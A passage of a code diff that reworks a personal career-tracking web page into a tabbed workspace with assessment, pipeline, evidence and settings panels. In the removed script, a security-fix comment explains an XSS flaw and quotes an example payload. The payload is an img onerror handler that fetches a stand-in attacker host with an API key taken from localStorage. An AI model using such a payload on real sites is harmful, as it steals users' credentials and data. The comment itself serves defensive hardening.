+  .ws-bar{grid-template-columns:1fr 44px}
+  .ws-bar .track{grid-column:1/-1;order:3}
 }
 @media print{
-  .site-header,.btn,.input-actions,.tracker-actions,.export-bar{display:none!important}
+  .ws-tabs-wrap,.btn,.ws-toasts,.shl-header,.shl-footer{display:none!important}
+  .ws-panel[hidden]{display:block!important}
   body{background:#fff;color:#000}
-  .glass,.glass-strong{background:#fff;border:1px solid #999;box-shadow:none}
-  .cover-letter{background:#f8f9fa;border:1px solid #ddd}
+  .ws-card{box-shadow:none;border:1px solid #999;background:#fff}
 }
 </style>
-<base target="_blank">
 <link rel="stylesheet" href="assets/css/app-shell.css">
 </head>
 <body>
@@ -341,110 +335,320 @@ html[data-theme="light"] .theme-toggle .icon-sun{display:block}
   </defs>
 </svg>
 
-<!-- ============ HEADER ============ -->
-
-
-<main id="main">
+<main id="main" data-asilva-career>
 
 <!-- ============ HERO ============ -->
-<section class="section ca-hero" style="padding:0">
-  <div class="ca-hero-banner"></div>
-  <div class="wrap">
-    <div class="ca-hero-inner">
-      <a class="breadcrumb" href="index.html" style="display:inline-flex;align-items:center;gap:.5rem;font-family:var(--font-cond);font-size:.78rem;letter-spacing:.1em;text-transform:uppercase;color:rgba(255,255,255,.55);margin-bottom:1rem;text-decoration:none"><svg style="width:13px;height:13px"><use href="#i-back"/></svg> Home <span aria-hidden="true">›</span> Career Automation</a>
-      <p class="kicker" style="color:#4db8ff">AI-Powered</p>
-      <h1>Opportunity Scanner & <span class="grad-text">Document Generator</span></h1>
-      <p class="hero-sub">Paste a job posting. Get a scored alignment analysis, recommended CV, and tailored cover letter — grounded in verified credentials, not hallucinations.</p>
+<section class="ws-hero" aria-labelledby="wsTitle">
+  <div class="wrap ws-hero-inner">
+    <a class="ws-crumb" href="index.html"><svg aria-hidden="true"><use href="#i-back"/></svg> Home <span aria-hidden="true">›</span> Career workspace</a>
+    <p class="kicker">Private workspace · Alvin M. Silva, MDM</p>
+    <h1 id="wsTitle">Career Intelligence &amp; <span class="grad-text">Opportunity Management</span></h1>
+    <p>Discover, understand, position, prepare, manage and develop. Assessments are rules-based and explainable — computed from <code>credentials.json</code>, not generated by AI — and every score shows its reasoning and evidence level. Mandatory and legal eligibility is always yours to confirm against the source posting.</p>
+    <div class="ws-status" role="status" aria-live="polite">
+      <span class="ws-chip info" id="wsDataStatus">Loading credentials…</span>
+      <span class="ws-chip" id="wsStoreStatus">Records: this browser</span>
+      <span class="ws-chip" id="wsModelStatus">Model —</span>
     </div>
   </div>
 </section>
 
-<!-- ============ INPUT ============ -->
-<section class="section" id="input-section">
+<!-- ============ TABS ============ -->
+<div class="ws-tabs-wrap">
   <div class="wrap">
-    <div class="input-card glass">
-      <label for="jobUrl" class="form-label">Job Posting URL</label>
-      <input type="url" id="jobUrl" placeholder="https://careers.example.com/job/12345" style="width:100%;padding:.8rem .95rem;border-radius:11px;color:var(--text);background:var(--input-bg);border:1.5px solid var(--line);font-family:var(--font-body);font-size:.94rem;margin-bottom:1rem;transition:.25s" onfocus="this.style.borderColor='var(--gold)';this.style.boxShadow='0 0 0 3px rgba(255,215,0,.18)';" onblur="this.style.borderColor='';this.style.boxShadow='';">
-      <div class="input-actions" style="margin-bottom:1rem">
-        <button class="btn btn-primary" id="fetchUrlBtn"><span>Fetch from URL</span><svg><use href="#i-arrow"/></svg></button>
-        <span style="margin-left:auto;font-size:.78rem;color:var(--text-3);display:flex;align-items:center;gap:.4rem">
-          <span id="personaBadge" style="padding:.25rem .7rem;border-radius:999px;border:1px solid var(--line);background:var(--pill-bg);font-family:var(--font-cond);font-weight:600;letter-spacing:.04em">No persona selected</span>
-        </span>
+    <div class="ws-tabs" role="tablist" aria-label="Career workspace sections" id="wsTabs">
+      <button class="ws-tab" role="tab" id="tab-overview" aria-controls="ws-overview" aria-selected="true" data-tab="overview">Overview</button>
+      <button class="ws-tab" role="tab" id="tab-discover" aria-controls="ws-discover" aria-selected="false" tabindex="-1" data-tab="discover">Discover</button>
+      <button class="ws-tab" role="tab" id="tab-assess" aria-controls="ws-assess" aria-selected="false" tabindex="-1" data-tab="assess">Assess</button>
+      <button class="ws-tab" role="tab" id="tab-applications" aria-controls="ws-applications" aria-selected="false" tabindex="-1" data-tab="applications">Applications <span class="ws-count" data-count="applications">0</span></button>
+      <button class="ws-tab" role="tab" id="tab-evidence" aria-controls="ws-evidence" aria-selected="false" tabindex="-1" data-tab="evidence">Evidence</button>
+      <button class="ws-tab" role="tab" id="tab-development" aria-controls="ws-development" aria-selected="false" tabindex="-1" data-tab="development">Development <span class="ws-count" data-count="development">0</span></button>
+      <button class="ws-tab" role="tab" id="tab-analytics" aria-controls="ws-analytics" aria-selected="false" tabindex="-1" data-tab="analytics">Analytics</button>
+      <button class="ws-tab" role="tab" id="tab-settings" aria-controls="ws-settings" aria-selected="false" tabindex="-1" data-tab="settings">Settings &amp; data</button>
+    </div>
+  </div>
+</div>
+
+<noscript><div class="wrap"><p class="ws-note bad">The career workspace needs JavaScript. Your records are stored in this browser and are processed locally.</p></div></noscript>
+
+<!-- ============ OVERVIEW ============ -->
+<section class="ws-panel" id="ws-overview" role="tabpanel" aria-labelledby="tab-overview" tabindex="0">
+  <div class="wrap">
+    <h2>Overview</h2>
+    <p class="ws-lead">Your pipeline at a glance, and what needs attention next.</p>
+    <div class="ws-grid cols-4" id="wsKpis" aria-live="polite"></div>
+    <div class="ws-steps" aria-label="Workflow">
+      <button class="ws-step" type="button" data-goto="discover"><b>Discover</b><span>Find opportunities across development sectors</span></button>
+      <button class="ws-step" type="button" data-goto="assess"><b>Understand</b><span>Requirements, eligibility and alignment</span></button>
+      <button class="ws-step" type="button" data-goto="assess" data-anchor="wsPositioning"><b>Position</b><span>Pathway and differentiating evidence</span></button>
+      <button class="ws-step" type="button" data-goto="assess" data-anchor="wsLetterCard"><b>Prepare</b><span>Evidence-backed CV choice and letter</span></button>
+      <button class="ws-step" type="button" data-goto="applications"><b>Manage</b><span>Deadlines, follow-ups and interviews</span></button>
+      <button class="ws-step" type="button" data-goto="development"><b>Develop</b><span>Close competency and evidence gaps</span></button>
+    </div>
+    <div class="ws-grid cols-2">
+      <div class="ws-card">
+        <h3><svg aria-hidden="true"><use href="#i-target"/></svg> Next actions</h3>
+        <ul class="ws-list" id="wsNext"></ul>
+        <div class="ws-row" style="margin-top:.8rem">
+          <button class="btn btn-ghost btn-sm" type="button" data-action="notify-enable" id="wsNotifyBtn">Enable deadline reminders</button>
+          <span class="ws-small">Reminders appear when this page is opened; there is no background push without the backend.</span>
+        </div>
       </div>
-      <div id="fetchStatus" style="display:none;font-size:.85rem;color:var(--text-3);margin-bottom:.8rem;padding:.6rem .8rem;border-radius:8px;background:var(--pill-bg)"></div>
-      <div style="border-top:1px solid var(--divider);padding-top:1rem">
-        <label for="jobInput" class="form-label" style="display:flex;align-items:center;gap:.5rem">
-          <span>Or paste job text manually</span>
-          <span style="font-size:.7rem;color:var(--text-3);font-weight:400;text-transform:none;letter-spacing:0">(if URL fetch is blocked)</span>
-        </label>
-        <textarea id="jobInput" placeholder="Paste the full job description here...&#10;&#10;Include:&#10;• Organization name&#10;• Role title&#10;• Required qualifications&#10;• Location&#10;• Application deadline&#10;• How to apply" style="min-height:120px"></textarea>
-      </div>
-      <div class="input-actions" style="margin-top:1rem">
-        <button class="btn btn-primary" id="analyzeBtn"><span>Analyze Opportunity</span><svg><use href="#i-arrow"/></svg></button>
-        <button class="btn btn-ghost" id="clearBtn">Clear</button>
+      <div class="ws-card">
+        <h3><svg aria-hidden="true"><use href="#i-chart"/></svg> Pipeline</h3>
+        <div id="wsPipelineMini"></div>
       </div>
     </div>
   </div>
 </section>
 
-<!-- ============ RESULTS ============ -->
-<section class="section" id="results-section" style="display:none">
+<!-- ============ DISCOVER ============ -->
+<section class="ws-panel" id="ws-discover" role="tabpanel" aria-labelledby="tab-discover" tabindex="0" hidden>
   <div class="wrap">
+    <h2>Discover</h2>
+    <p class="ws-lead">A curated source registry and a quick capture for opportunities you find. Automated scanning of job boards is not running — it needs the server-side retrieval service (see Settings).</p>
+    <div class="ws-grid cols-2">
+      <div class="ws-card">
+        <h3><svg aria-hidden="true"><use href="#i-book"/></svg> Source registry</h3>
+        <div id="wsSources"></div>
+        <h4>Add a source</h4>
+        <form class="ws-row" id="wsSourceForm" autocomplete="off">
+          <label class="sr-only" for="wsSrcName">Source name</label>
+          <input class="ws-input grow" id="wsSrcName" name="name" placeholder="Source name" required maxlength="80">
+          <label class="sr-only" for="wsSrcUrl">Source URL</label>
+          <input class="ws-input grow" id="wsSrcUrl" name="url" type="url" placeholder="https://…" required>
+          <button class="btn btn-ghost btn-sm" type="submit">Add</button>
+        </form>
+      </div>
+      <div class="ws-card">
+        <h3><svg aria-hidden="true"><use href="#i-star"/></svg> Log a discovered opportunity</h3>
+        <form id="wsCaptureForm" autocomplete="off">
+          <div class="ws-field"><label class="ws-label" for="wsCapTitle">Position</label><input class="ws-input" id="wsCapTitle" name="title" required maxlength="160"></div>
+          <div class="ws-field"><label class="ws-label" for="wsCapOrg">Organization</label><input class="ws-input" id="wsCapOrg" name="organization" required maxlength="160"></div>
+          <div class="ws-grid cols-2">
+            <div class="ws-field"><label class="ws-label" for="wsCapUrl">Posting URL</label><input class="ws-input" id="wsCapUrl" name="url" type="url" placeholder="https://…"></div>
+            <div class="ws-field"><label class="ws-label" for="wsCapDeadline">Deadline</label><input class="ws-input" id="wsCapDeadline" name="deadline" type="date"></div>
+          </div>
+          <div class="ws-row"><button class="btn btn-primary btn-sm" type="submit">Add to pipeline</button><span class="ws-small">Saved as “Discovered”. Assess it when you have the full text.</span></div>
+        </form>
+      </div>
+    </div>
+  </div>
+</section>
 
-    <!-- Extracted Details -->
-    <div class="result-card glass" id="extractedCard">
-      <h3><svg><use href="#i-target"/></svg> Extracted Details</h3>
-      <div id="extractedContent" style="display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:1rem"></div>
+<!-- ============ ASSESS ============ -->
+<section class="ws-panel" id="ws-assess" role="tabpanel" aria-labelledby="tab-assess" tabindex="0" hidden>
+  <div class="wrap">
+    <h2>Assess an opportunity</h2>
+    <p class="ws-lead">Paste the full posting or terms of reference. Validate what was extracted, then review eligibility, the three scores and the evidence behind them.</p>
+
+    <div class="ws-card" id="wsInputCard">
+      <h3><svg aria-hidden="true"><use href="#i-file"/></svg> 1 · Posting</h3>
+      <div class="ws-field">
+        <label class="ws-label" for="wsUrl">Posting URL (optional)</label>
+        <div class="ws-row">
+          <input class="ws-input grow" type="url" id="wsUrl" placeholder="https://careers.example.org/job/12345" inputmode="url">
+          <button class="btn btn-ghost btn-sm" type="button" data-action="fetch-url" id="wsFetchBtn">Fetch text</button>
+        </div>
+        <p class="ws-small" id="wsFetchNote">Most job sites block in-browser retrieval. Configure the retrieval service in Settings, or paste the text below.</p>
+      </div>
+      <div class="ws-field">
+        <label class="ws-label" for="wsText">Posting text</label>
+        <textarea class="ws-textarea" id="wsText" rows="10" placeholder="Paste the full job description: title, organization, responsibilities, qualifications (required and desirable), location, deadline and how to apply."></textarea>
+        <p class="ws-small"><span id="wsTextCount">0</span> words · the text is processed in this browser.</p>
+      </div>
+      <div class="ws-row">
+        <button class="btn btn-primary" type="button" data-action="analyze" id="wsAnalyzeBtn"><span>Analyze</span><svg aria-hidden="true"><use href="#i-arrow"/></svg></button>
+        <button class="btn btn-ghost btn-sm" type="button" data-action="clear-assess">Clear</button>
+        <span class="ws-small" id="wsAssessContext"></span>
+      </div>
     </div>
 
-    <!-- Scoring -->
-    <div class="result-card glass" id="scoringCard">
-      <h3><svg><use href="#i-chart"/></svg> Alignment Score</h3>
-      <div style="text-align:center;margin-bottom:1.5rem">
-        <div class="score-total" id="totalScore">0</div>
-        <div class="score-label" id="scoreLabel">Analyzing...</div>
-        <div id="scoreVerdict" class="score-verdict" style="margin-top:.8rem"></div>
+    <div id="wsResults" hidden>
+      <div class="ws-card" id="wsExtractCard">
+        <h3><svg aria-hidden="true"><use href="#i-target"/></svg> 2 · Validate extracted details <span class="ws-badge" id="wsExtractConf"></span></h3>
+        <p class="ws-small">Correct anything wrong, then re-assess. Edited fields are marked “user” and recorded with the assessment.</p>
+        <form id="wsFieldsForm" class="ws-fields" autocomplete="off"></form>
+        <div class="ws-row" style="margin-top:.8rem"><button class="btn btn-primary btn-sm" type="button" data-action="reassess">Re-assess with corrections</button></div>
+        <details style="margin-top:1rem"><summary class="ws-link" style="text-decoration:none">Requirement statements detected (<span id="wsReqCount">0</span>)</summary><div id="wsReqs" style="margin-top:.6rem"></div></details>
       </div>
-      <div id="scoreBreakdown"></div>
-      <div style="margin-top:1.2rem;padding-top:1rem;border-top:1px solid var(--divider)">
-        <h4 style="font-family:var(--font-cond);font-size:.78rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--gold);margin-bottom:.6rem">Gap Analysis</h4>
-        <div id="gapAnalysis"></div>
-      </div>
-    </div>
 
-    <!-- Recommendation -->
-    <div class="result-card glass" id="recommendationCard">
-      <h3><svg><use href="#i-star"/></svg> Recommendation</h3>
-      <div id="cvRecommendation"></div>
-      <div style="margin-top:1.2rem">
-        <h4 style="font-family:var(--font-cond);font-size:.78rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--gold);margin-bottom:.6rem">Tailored Cover Letter</h4>
-        <div class="cover-letter" id="coverLetter"></div>
-        <div class="export-bar">
-          <button class="btn btn-ghost btn-sm" id="copyLetterBtn"><svg><use href="#i-clipboard"/></svg><span>Copy</span></button>
-          <button class="btn btn-primary btn-sm" id="saveTrackerBtn"><svg><use href="#i-star"/></svg><span>Save to Tracker</span></button>
+      <div class="ws-card">
+        <h3><svg aria-hidden="true"><use href="#i-chart"/></svg> 3 · Assessment</h3>
+        <div id="wsDecision"></div>
+        <div class="ws-scores" id="wsScores"></div>
+        <div class="ws-grid cols-2">
+          <div><h4>Eligibility checks</h4><div id="wsElig"></div></div>
+          <div><h4>A · Professional alignment — breakdown</h4><div id="wsAlign"></div></div>
+        </div>
+        <div class="ws-grid cols-2">
+          <div><h4>B · Application feasibility</h4><div id="wsFeas"></div></div>
+          <div><h4>C · Career value</h4><div id="wsValue"></div></div>
+        </div>
+      </div>
+
+      <div class="ws-grid cols-2">
+        <div class="ws-card">
+          <h3><svg aria-hidden="true"><use href="#i-shield"/></svg> Required competencies &amp; evidence</h3>
+          <div id="wsComps"></div>
+        </div>
+        <div class="ws-card">
+          <h3><svg aria-hidden="true"><use href="#i-bulb"/></svg> Gaps — competency, evidence, credential, eligibility</h3>
+          <div id="wsGaps"></div>
+        </div>
+      </div>
+
+      <div class="ws-card" id="wsPositioning">
+        <h3><svg aria-hidden="true"><use href="#i-user"/></svg> Positioning &amp; documents</h3>
+        <div class="ws-grid cols-2">
+          <div><h4>Career pathway</h4><div id="wsPath"></div><h4>Portfolio evidence to feature</h4><div id="wsProjects"></div></div>
+          <div><h4>Ranked CV shortlist</h4><div id="wsCvs"></div></div>
+        </div>
+      </div>
+
+      <div class="ws-card" id="wsLetterCard">
+        <h3><svg aria-hidden="true"><use href="#i-mail"/></svg> Evidence-backed letter</h3>
+        <p class="ws-small">The letter is composed only from the claims you select. Each claim shows its source and evidence level. Inferred and unverified claims are off by default.</p>
+        <div class="ws-grid cols-2">
+          <div><h4>Claims</h4><div id="wsClaims"></div></div>
+          <div>
+            <h4>Draft</h4>
+            <div class="ws-row" style="margin-bottom:.6rem">
+              <label class="ws-small" for="wsTone">Tone</label>
+              <select class="ws-select" id="wsTone" style="width:auto"><option value="formal">Formal</option><option value="concise">Concise</option></select>
+              <label class="ws-check"><input type="checkbox" id="wsAckGaps"> Acknowledge the main gap</label>
+            </div>
+            <label class="sr-only" for="wsLetter">Letter draft</label>
+            <textarea class="ws-textarea" id="wsLetter" rows="18"></textarea>
+            <div class="ws-row" style="margin-top:.6rem">
+              <button class="btn btn-ghost btn-sm" type="button" data-action="copy-letter"><svg aria-hidden="true"><use href="#i-clipboard"/></svg><span>Copy</span></button>
+              <button class="btn btn-ghost btn-sm" type="button" data-action="download-letter"><svg aria-hidden="true"><use href="#i-download"/></svg><span>Download .txt</span></button>
+            </div>
+          </div>
+        </div>
+        <div class="ws-row end" style="margin-top:1rem;border-top:1px solid var(--divider);padding-top:1rem">
+          <span class="ws-small" id="wsSaveNote"></span>
+          <button class="btn btn-primary" type="button" data-action="save-opportunity" id="wsSaveBtn"><svg aria-hidden="true"><use href="#i-star"/></svg><span>Save to pipeline</span></button>
         </div>
       </div>
     </div>
-
   </div>
 </section>
 
-<!-- ============ TRACKER ============ -->
-<section class="section" id="tracker-section">
+<!-- ============ APPLICATIONS ============ -->
+<section class="ws-panel" id="ws-applications" role="tabpanel" aria-labelledby="tab-applications" tabindex="0" hidden>
   <div class="wrap">
-    <p class="kicker">Tracker</p>
-    <h2 class="section-title">Saved <span class="hl">Opportunities</span></h2>
-    <p class="section-sub">All scored, ranked, and ready for action. Update status as you progress.</p>
-    <div class="glass" style="border-radius:18px;overflow:hidden">
-      <div id="trackerContent">
-        <div class="tracker-empty">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M9 5H7a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2h-2M9 5a2 2 0 0 0 2 2h2a2 2 0 0 0 2-2M9 5a2 2 0 0 1 2-2h2a2 2 0 0 1 2 2m-3 7h3m-3 4h3m-6-4h.01M9 16h.01"/></svg>
-          <p>No opportunities tracked yet.<br>Paste a job posting above to get started.</p>
-        </div>
+    <h2>Applications</h2>
+    <p class="ws-lead">Every saved opportunity, its stage, deadline and scores. Open a record to manage documents, contacts, follow-ups, interviews and outcome.</p>
+    <div class="ws-card">
+      <div class="ws-row" style="margin-bottom:.9rem">
+        <label class="sr-only" for="wsAppSearch">Search</label>
+        <input class="ws-input grow" id="wsAppSearch" type="search" placeholder="Search organization or position">
+        <label class="sr-only" for="wsAppStatus">Status filter</label>
+        <select class="ws-select" id="wsAppStatus" style="width:auto"><option value="active">Active</option><option value="all">All</option><option value="closed">Closed</option></select>
+        <label class="sr-only" for="wsAppSort">Sort</label>
+        <select class="ws-select" id="wsAppSort" style="width:auto"><option value="deadline">Deadline</option><option value="updated">Last updated</option><option value="alignment">Alignment</option><option value="value">Career value</option></select>
       </div>
-      <div class="export-bar" style="padding:1rem;border-top:1px solid var(--divider)">
-        <button class="btn btn-ghost btn-sm" id="exportCsvBtn"><svg><use href="#i-download"/></svg><span>Export CSV</span></button>
-        <button class="btn btn-ghost btn-sm" id="clearTrackerBtn" style="color:var(--red);border-color:var(--red)"><svg><use href="#i-trash"/></svg><span>Clear All</span></button>
+      <div id="wsApps"></div>
+      <div class="ws-row" style="margin-top:.9rem">
+        <button class="btn btn-ghost btn-sm" type="button" data-action="export-csv"><svg aria-hidden="true"><use href="#i-download"/></svg><span>Export CSV</span></button>
+        <button class="btn btn-ghost btn-sm" type="button" data-action="export-json"><svg aria-hidden="true"><use href="#i-download"/></svg><span>Export JSON backup</span></button>
+        <button class="btn btn-ghost btn-sm" type="button" data-action="export-ics-all">Deadlines → calendar (.ics)</button>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ EVIDENCE ============ -->
+<section class="ws-panel" id="ws-evidence" role="tabpanel" aria-labelledby="tab-evidence" tabindex="0" hidden>
+  <div class="wrap">
+    <h2>Professional evidence</h2>
+    <p class="ws-lead">What the assessments can draw on, read live from <code>credentials.json</code>. Evidence levels: <span class="ws-badge verified">Verified</span> <span class="ws-badge documented">Documented</span> <span class="ws-badge self-reported">Self-reported</span> <span class="ws-badge inferred">Inferred</span>.</p>
+    <div class="ws-card"><h3><svg aria-hidden="true"><use href="#i-shield"/></svg> Data quality</h3><div id="wsQuality"></div></div>
+    <div class="ws-card"><h3><svg aria-hidden="true"><use href="#i-chart"/></svg> Competency strength</h3><p class="ws-small">Strength combines the number and quality of evidence records; expired credentials and keyword-only links count little or nothing.</p><div id="wsStrength"></div></div>
+    <div class="ws-card">
+      <h3><svg aria-hidden="true"><use href="#i-book"/></svg> Evidence records</h3>
+      <div class="ws-row" style="margin-bottom:.8rem">
+        <label class="sr-only" for="wsEvKind">Record type</label>
+        <select class="ws-select" id="wsEvKind" style="width:auto"><option value="">All types</option><option value="project">Projects</option><option value="certification">Certifications</option><option value="training">Training</option><option value="membership">Memberships</option><option value="appointment">Appointments</option><option value="publication">Publications</option><option value="discipline">Disciplines</option><option value="degree">Degrees</option></select>
+        <label class="sr-only" for="wsEvComp">Competency</label>
+        <select class="ws-select" id="wsEvComp" style="width:auto"><option value="">All competencies</option></select>
+      </div>
+      <div id="wsEvidence"></div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ DEVELOPMENT ============ -->
+<section class="ws-panel" id="ws-development" role="tabpanel" aria-labelledby="tab-development" tabindex="0" hidden>
+  <div class="wrap">
+    <h2>Development roadmap</h2>
+    <p class="ws-lead">Gaps become actions. An <strong>evidence gap</strong> (you have the competency but it is not documented) calls for documentation, not a course; a <strong>competency gap</strong> calls for development.</p>
+    <div class="ws-card"><h3><svg aria-hidden="true"><use href="#i-bulb"/></svg> Recurring gaps across saved opportunities</h3><div id="wsRecurring"></div></div>
+    <div class="ws-card"><h3><svg aria-hidden="true"><use href="#i-target"/></svg> Plan</h3><div id="wsPlan"></div></div>
+  </div>
+</section>
+
+<!-- ============ ANALYTICS ============ -->
+<section class="ws-panel" id="ws-analytics" role="tabpanel" aria-labelledby="tab-analytics" tabindex="0" hidden>
+  <div class="wrap">
+    <h2>Career analytics</h2>
+    <p class="ws-lead">Counts, conversion rates with their denominators, and time indicators from your own records. Small numbers are flagged — treat them as signals, not conclusions. A rejection is not proof that a score was wrong.</p>
+    <div id="wsAnalytics"></div>
+  </div>
+</section>
+
+<!-- ============ SETTINGS ============ -->
+<section class="ws-panel" id="ws-settings" role="tabpanel" aria-labelledby="tab-settings" tabindex="0" hidden>
+  <div class="wrap">
+    <h2>Settings &amp; data</h2>
+    <p class="ws-lead">Career direction, privacy and retention, the optional private backend, and your data.</p>
+    <div class="ws-grid cols-2">
+      <div class="ws-card"><h3><svg aria-hidden="true"><use href="#i-target"/></svg> Career direction</h3><p class="ws-small">How much you want each pathway (1 = avoid, 5 = top priority). Used for the strategic-direction and career-value scores.</p><form id="wsPathForm"></form></div>
+      <div class="ws-card">
+        <h3><svg aria-hidden="true"><use href="#i-shield"/></svg> Privacy &amp; retention</h3>
+        <form id="wsPrivacyForm">
+          <label class="ws-check"><input type="checkbox" name="storeSourceText"> Keep the posting text with saved records (needed to re-assess later)</label>
+          <label class="ws-check"><input type="checkbox" name="storeLetters"> Keep letter drafts with saved records</label>
+          <div class="ws-grid cols-2" style="margin-top:.7rem">
+            <div class="ws-field"><label class="ws-label" for="wsRetention">Purge closed records’ text after (days, 0 = never)</label><input class="ws-input" id="wsRetention" name="retentionDays" type="number" min="0" max="3650"></div>
+            <div class="ws-field"><label class="ws-label" for="wsNotifyDays">Deadline window (days)</label><input class="ws-input" id="wsNotifyDays" name="notifyDays" type="number" min="1" max="60"></div>
+          </div>
+          <button class="btn btn-ghost btn-sm" type="submit">Save</button>
+        </form>
+      </div>
+      <div class="ws-card">
+        <h3><svg aria-hidden="true"><use href="#i-shield"/></svg> Private backend (optional)</h3>
+        <p class="ws-small">Supabase Auth + Postgres with row-level security, and the <code>job-extract</code> retrieval function. Files: <code>supabase/</code> in this repository. Leave empty to keep everything in this browser.</p>
+        <form id="wsSyncForm" autocomplete="off">
+          <div class="ws-field"><label class="ws-label" for="wsSbUrl">Project URL</label><input class="ws-input" id="wsSbUrl" name="url" placeholder="https://xxxx.supabase.co"></div>
+          <div class="ws-field"><label class="ws-label" for="wsSbKey">Anon (publishable) key</label><input class="ws-input" id="wsSbKey" name="anonKey" placeholder="eyJ…"></div>
+          <div class="ws-field"><label class="ws-label" for="wsSbExtract">Retrieval endpoint (optional override)</label><input class="ws-input" id="wsSbExtract" name="extractEndpoint" placeholder="defaults to {project}/functions/v1/job-extract"></div>
+          <button class="btn btn-ghost btn-sm" type="submit">Save configuration</button>
+        </form>
+        <h4>Account</h4>
+        <p class="ws-small" id="wsSyncState"></p>
+        <form class="ws-row" id="wsSignInForm" autocomplete="on">
+          <label class="sr-only" for="wsSignEmail">E-mail</label>
+          <input class="ws-input grow" id="wsSignEmail" type="email" name="email" placeholder="your account e-mail" autocomplete="email">
+          <button class="btn btn-primary btn-sm" type="submit">Send sign-in link</button>
+        </form>
+        <div class="ws-row" style="margin-top:.6rem"><button class="btn btn-ghost btn-sm" type="button" data-action="sync-now">Sync now</button><button class="btn btn-ghost btn-sm" type="button" data-action="sign-out">Sign out</button></div>
+      </div>
+      <div class="ws-card">
+        <h3><svg aria-hidden="true"><use href="#i-download"/></svg> Your data</h3>
+        <p class="ws-small" id="wsUsage"></p>
+        <div class="ws-row">
+          <button class="btn btn-ghost btn-sm" type="button" data-action="export-json">Export JSON backup</button>
+          <button class="btn btn-ghost btn-sm" type="button" data-action="export-csv">Export CSV</button>
+          <label class="btn btn-ghost btn-sm" for="wsImport" style="cursor:pointer">Import JSON</label>
+          <input type="file" id="wsImport" accept="application/json,.json" class="sr-only">
+        </div>
+        <div id="wsLegacy"></div>
+        <h4>Credentials source</h4>
+        <div id="wsSourceInfo"></div>
+        <div class="ws-row" style="margin-top:.6rem"><button class="btn btn-ghost btn-sm" type="button" data-action="reload-data">Reload credentials.json</button></div>
+        <h4>Danger zone</h4>
+        <button class="btn btn-danger btn-sm" type="button" data-action="clear-all"><svg aria-hidden="true"><use href="#i-trash"/></svg><span>Delete all records in this browser</span></button>
       </div>
     </div>
   </div>
@@ -452,603 +656,15 @@ html[data-theme="light"] .theme-toggle .icon-sun{display:block}
 
 </main>
 
-<!-- ============ FOOTER ============ -->
+<dialog class="ws-dialog" id="wsDialog" aria-labelledby="wsDialogTitle">
+  <div class="ws-dialog-head"><h3 id="wsDialogTitle">Record</h3><button class="ws-x" type="button" data-action="dialog-close" aria-label="Close">×</button></div>
+  <div class="ws-dialog-body" id="wsDialogBody"></div>
+</dialog>
+<div class="ws-toasts" id="wsToasts" aria-live="polite" aria-atomic="false"></div>
 
-<script>
-(function() {
-  'use strict';
-
-document.documentElement.classList.add('js');
-
-/* ================================================================
-   THEME TOGGLE
-   ================================================================ */
-(function themeInit() {
-  const THEME_KEY = 'as-theme';
-  const root = document.documentElement;
-  function apply(theme) {
-    root.dataset.theme = theme;
-    localStorage.setItem(THEME_KEY, theme);
-    const btn = document.getElementById('themeToggle');
-    if (btn) {
-      btn.setAttribute('aria-pressed', theme === 'light');
-      btn.setAttribute('aria-label', theme === 'light' ? 'Switch to dark mode' : 'Switch to light mode');
-    }
-  }
-  const saved = localStorage.getItem(THEME_KEY);
-  const prefersLight = window.matchMedia && window.matchMedia('(prefers-color-scheme: light)').matches;
-  apply(saved || (prefersLight ? 'light' : 'dark'));
-  document.getElementById('themeToggle')?.addEventListener('click', () => apply(root.dataset.theme === 'light' ? 'dark' : 'light'));
-})();
-
-/* ================================================================
-   NAV: dropdowns + mobile menu
-   ================================================================ */
-const $ = (s, c = document) => c.querySelector(s);
-
-// SECURITY FIX (audit 2026-08-04): user-pasted job-posting text is parsed and
-// later interpolated into innerHTML. Without escaping, a crafted paste (e.g.
-// "Organization: <img src=x onerror=fetch('https://evil/?c='+localStorage.getItem('asilva-kimi-key'))>")
-// executes arbitrary script in the page (stored/DOM-based self-XSS), which can
-// read localStorage (API keys) or the tracker data. `escapeHtml()` already
-// existed further down this file but was applied inconsistently (tracker's
-// organization/role were escaped; extractedContent, deadline, and gap fields
-// were not). Hoisted here and applied everywhere job-derived text touches
-// innerHTML — see renderExtracted() and renderTracker() below.
-function escapeHtml(text) { const div = document.createElement('div'); div.textContent = text ?? ''; return div.innerHTML; }
-const $$ = (s, c = document) => [...c.querySelectorAll(s)];
-
-$$('[data-drop] > .drop-btn').forEach(btn => {
-  btn.addEventListener('click', e => {
-    e.stopPropagation();
-    const drop = btn.parentElement, wasOpen = drop.classList.contains('open');
-    $$('[data-drop]').forEach(d => { d.classList.remove('open'); d.querySelector('.drop-btn').setAttribute('aria-expanded', 'false'); });
-    if (!wasOpen) { drop.classList.add('open'); btn.setAttribute('aria-expanded', 'true'); }
-  });
-});
-document.addEventListener('click', e => {
-  if (!e.target.closest('[data-drop]')) $$('[data-drop]').forEach(d => { d.classList.remove('open'); d.querySelector('.drop-btn').setAttribute('aria-expanded', 'false'); });
-});
-
-const mm = $('#mobileMenu'), overlay = $('#overlay'), menuBtn = $('#menuBtn');
-function openMobile() { mm?.classList.add('open'); overlay?.classList.add('show'); menuBtn?.setAttribute('aria-expanded', 'true'); document.body.style.overflow = 'hidden'; }
-function closeMobile() { mm?.classList.remove('open'); overlay?.classList.remove('show'); menuBtn?.setAttribute('aria-expanded', 'false'); document.body.style.overflow = ''; }
-menuBtn?.addEventListener('click', openMobile);
-$('#mmClose')?.addEventListener('click', closeMobile);
-overlay?.addEventListener('click', closeMobile);
-$$('.mm-link', mm || document).forEach(a => a.addEventListener('click', closeMobile));
-document.addEventListener('keydown', e => { if (e.key === 'Escape') { closeMobile(); $$('[data-drop]').forEach(d => d.classList.remove('open')); } });
-
-/* ================================================================
-   PERSONA BADGE
-   ================================================================ */
-(function personaBadgeInit() {
-  const persona = localStorage.getItem('as-persona');
-  const badge = $('#personaBadge');
-  const labels = { government: 'Government & Policy', humanitarian: 'NGO & Humanitarian', private: 'Private Sector', academic: 'Academia & Research' };
-  if (badge && persona && labels[persona]) {
-    badge.textContent = labels[persona];
-    badge.style.borderColor = 'var(--gold)';
